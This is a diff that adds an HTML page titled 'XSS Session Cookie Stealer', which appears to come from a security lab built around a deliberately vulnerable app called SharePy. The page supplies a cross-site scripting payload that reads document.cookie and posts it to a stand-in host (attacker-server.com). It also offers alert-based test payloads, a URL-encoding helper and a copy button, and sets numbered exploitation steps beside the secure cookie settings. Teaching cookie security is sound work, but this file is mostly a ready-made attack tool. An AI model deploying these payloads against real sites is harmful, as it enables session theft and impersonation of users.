@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Session Cookie Stealer</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        input[type="text"], textarea {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        textarea {
+            height: 150px;
+            font-family: monospace;
+        }
+        button {
+            background: #007cba;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #005a87;
+        }
+        .result {
+            margin-top: 20px;
+            padding: 15px;
+            background: #f0f8ff;
+            border: 1px solid #b3d9ff;
+            border-radius: 4px;
+        }
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            padding: 15px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>XSS Session Cookie Stealer</h1>
+        
+        <div class="warning">
+            <strong>Warning:</strong> This tool is designed for educational purposes only to demonstrate 
+            the risks of insecure session cookies (missing Secure, HttpOnly, and SameSite attributes). 
+            Use only on applications you own or have explicit permission to test.
+        </div>
+        
+        <div class="input-group">
+            <label for="xssPayload">XSS Payload to steal session cookie:</label>
+            <textarea id="xssPayload" readonly>&lt;script&gt;
+// Steal session cookie and send to attacker's server
+var sessionCookie = document.cookie;
+var xhr = new XMLHttpRequest();
+xhr.open('POST', 'http://attacker-server.com/steal', true);
+xhr.setRequestHeader('Content-Type', 'application/json');
+xhr.send(JSON.stringify({
+    'session_cookie': sessionCookie,
+    'url': window.location.href,
+    'timestamp': new Date().toISOString()
+}));
+&lt;/script&gt;</textarea>
+        </div>
+        
+        <div class="input-group">
+            <label for="simplePayload">Simple session cookie alert (for testing):</label>
+            <textarea id="simplePayload" readonly>&lt;script&gt;
+alert('Session Cookie: ' + document.cookie);
+&lt;/script&gt;</textarea>
+        </div>
+        
+        <div class="input-group">
+            <label for="inputField">Input field to test XSS (place this in vulnerable input):</label>
+            <input type="text" id="inputField" value="&lt;script&gt;alert(document.cookie)&lt;/script&gt;" readonly>
+        </div>
+        
+        <div class="input-group">
+            <label for="encodedPayload">URL-encoded payload for GET parameters:</label>
+            <input type="text" id="encodedPayload" value="" readonly>
+        </div>
+        
+        <h3>How to exploit insecure session cookies:</h3>
+        <ol>
+            <li><strong>Vulnerability:</strong> The SharePy application sets session cookies without HttpOnly flag (line 94 in vulnerable main.py)</li>
+            <li><strong>Impact:</strong> JavaScript can access the session cookie via document.cookie</li>
+            <li><strong>Exploitation:</strong> Inject XSS payload in any vulnerable input field</li>
+            <li><strong>Result:</strong> Attacker can steal the session token and impersonate the user</li>
+        </ol>
+        
+        <div class="result">
+            <h3>About the Vulnerability:</h3>
+            <p>In the vulnerable SharePy application, the session cookie is set like this:</p>
+            <pre>response.set_cookie("session", token)  # INSECURE!</pre>
+            
+            <p>But it should be set like this (as in the secure version):</p>
+            <pre>response.set_cookie(
+    "session",
+    token,
+    secure=True,      # HTTPS only
+    httponly=True,    # No JavaScript access
+    samesite="strict" # CSRF protection
+)</pre>
+        </div>
+        
+        <button onclick="copyPayload()">Copy XSS Payload to Clipboard</button>
+        <button onclick="generateEncoded()">Generate URL-encoded Payload</button>
+    </div>
+
+    <script>
+        function copyPayload() {
+            const payload = document.getElementById('xssPayload').value;
+            navigator.clipboard.writeText(payload).then(() => {
+                alert('XSS payload copied to clipboard!');
+            });
+        }
+        
+        function generateEncoded() {
+            const payload = "<" + "script>alert(document.cookie)</" + "script>";
+            const encoded = encodeURIComponent(payload);
+            document.getElementById('encodedPayload').value = encoded;
+            alert('URL-encoded payload generated!');
+        }
+    </script>
+</body>
+</html>
